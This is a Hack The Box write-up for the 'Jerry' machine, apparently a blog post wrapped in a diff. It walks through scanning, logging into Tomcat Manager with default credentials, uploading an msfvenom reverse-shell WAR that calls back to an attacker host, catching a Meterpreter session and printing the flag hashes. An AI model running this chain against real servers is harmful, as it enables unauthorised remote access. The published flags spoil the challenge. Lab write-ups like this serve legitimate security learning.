@@ -1,0 +1,181 @@
+I"�8<p>Jerry is an easy level HTB challenge from the HTB archives. The challenge involves basic CVE discovery through enumeration scans, and requires manual exploitation of the tomcat apache webserver. Overall this was a straightforward CTF challenge.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>First, I conducted a quick nmap scan of the top 200 ports to get a quick idea on the targets running services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/jerry]
+└─<span class="nv">$ </span>nmap <span class="nt">--top-ports</span> 200 <span class="nt">-Pn</span> 10.10.10.95
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-04 15:43 EST
+Nmap scan report <span class="k">for </span>10.10.10.95
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 199 filtered ports
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.92 seconds
+</code></pre></div></div>
+
+<p>The results showed an open webserver on port 8080. I started a more in-depth scan using the nmapAutomator script.  Output from the scan revealed the server was running the apache tomcat webserver, a technology used to run java servlets and other java web technologies.  The recon stage of the script used Gobuster to brute force  directories, which revealed the apache tomcat <code class="language-plaintext highlighter-rouge">/manager</code> path.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---------------------Running</span> Recon Commands----------------------
+                                                                                                                                                           
+
+Starting gobuster scan
+                                                                                                                                                           
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.95:8080
+<span class="o">[</span>+] Threads:        30
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Show length:    <span class="nb">true</span>
+<span class="o">[</span>+] Extensions:     html,php
+<span class="o">[</span>+] Expanded:       <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2021/03/04 15:51:47 Starting gobuster
+<span class="o">===============================================================</span>
+http://10.10.10.95:8080/aux <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/com2 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/com1 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/com3 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/con <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/docs <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/examples <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/favicon.ico <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 21630]
+http://10.10.10.95:8080/host-manager <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/lpt1 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/lpt2 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/manager <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/nul <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+http://10.10.10.95:8080/prn <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+</code></pre></div></div>
+
+<h2 id="password-cracking">Password Cracking</h2>
+
+<p>Upon visiting the manager URL, I was met with a basic HTTP authentication login form. From the eJPT course and certification exam, I already knew the default password for apache tomcat  was username:tomcat password:s3cret. Indeed, when I tried that combination it worked, showing the server was left secured with default credentials. This could also have been deduced using nikto, which also revealed the weak authentication.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting nikto scan
+                                                                                                                                                           
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.10.10.95
++ Target Hostname:    10.10.10.95
++ Target Port:        8080
++ Start Time:         2021-03-04 15:52:18 <span class="o">(</span>GMT-5<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ No CGI Directories found <span class="o">(</span>use <span class="s1">'-C all'</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat <span class="o">(</span>possibly 5.5.26 through 8.0.15<span class="o">)</span>, Alfresco Community
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method <span class="o">(</span><span class="s1">'Allow'</span> Header<span class="o">)</span>: <span class="s1">'PUT'</span> method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method <span class="o">(</span><span class="s1">'Allow'</span> Header<span class="o">)</span>: <span class="s1">'DELETE'</span> may allow clients to remove files on the web server.
++ Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ Default account found <span class="k">for</span> <span class="s1">'Tomcat Manager Application'</span> at /manager/html <span class="o">(</span>ID <span class="s1">'tomcat'</span>, PW <span class="s1">'s3cret'</span><span class="o">)</span><span class="nb">.</span> Apache Tomcat.
++ /host-manager/html: Default Tomcat Manager / Host Manager interface found
++ /manager/html: Tomcat Manager / Host Manager interface found <span class="o">(</span>pass protected<span class="o">)</span>
++ /manager/status: Tomcat Server Status interface found <span class="o">(</span>pass protected<span class="o">)</span>
++ 7967 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 14 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2021-03-04 15:56:50 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span>272 seconds<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ 1 host<span class="o">(</span>s<span class="o">)</span> tested
+
+Finished nikto scan
+                                                                                                                                                           
+<span class="o">=========================</span>
+</code></pre></div></div>
+
+<p>After authenticating to the server, I found the manager application allowed the admin to upload a WAR file which would be executed by the server.</p>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-03-04-jerry-hack-the-box-walkthrough/upload.png" />
+    </div>
+</div>
+<p><br /></p>
+
+<h2 id="payload-creation">Payload Creation</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">msfvenom</code>, I created a reverse tcp shell payload to upload to the target server. Once executed, the payload would connect back to my attacker machine on port 4443.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/jerry]
+└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.13 <span class="nv">lport</span><span class="o">=</span>4443 <span class="nt">-f</span> war <span class="nt">-o</span> pwn.war
+Payload size: 13401 bytes
+Final size of war file: 13401 bytes
+Saved as: pwn.war
+</code></pre></div></div>
+
+<p>Using the manager application, the payload was uploaded.</p>
+
+<h2 id="catching-a-reverse-shell">Catching a Reverse Shell</h2>
+
+<p>Before triggering the payload, I used the multi/handler on <code class="language-plaintext highlighter-rouge">metasploit</code> to start a listener on my attacker machine to receive the reverse shell. Once the listener was started, I browsed to the location of the payload on the server, triggering the payload, and sending a reverse shell to my machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
+
+   Name  Current Setting  Required  Description
+   <span class="nt">----</span>  <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+
+
+Payload options <span class="o">(</span>linux/x64/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.10.14.13      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4443             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Wildcard Target
+
+
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4443 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>3008420 bytes<span class="o">)</span> to 10.10.10.95
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.13:4443 -&gt; 127.0.0.1<span class="o">)</span> at 2021-03-04 18:58:40 <span class="nt">-0500</span>
+</code></pre></div></div>
+
+<h2 id="finding-the-flags">Finding the Flags</h2>
+
+<p>To find the flags, I dropped into the shell and manually searched the target to find the flag files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is FC2B-E489
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags
+
+06/19/2018  06:09 AM    &lt;DIR&gt;          <span class="nb">.</span>
+06/19/2018  06:09 AM    &lt;DIR&gt;          ..
+06/19/2018  06:11 AM                88 2 <span class="k">for </span>the price of 1.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             88 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>  27,601,940,480 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags&gt;type <span class="s2">"2 for the price of 1.txt"</span>
+<span class="nb">type</span> <span class="s2">"2 for the price of 1.txt"</span>
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\f</span>lags&gt;
+</code></pre></div></div>
+
+:ET
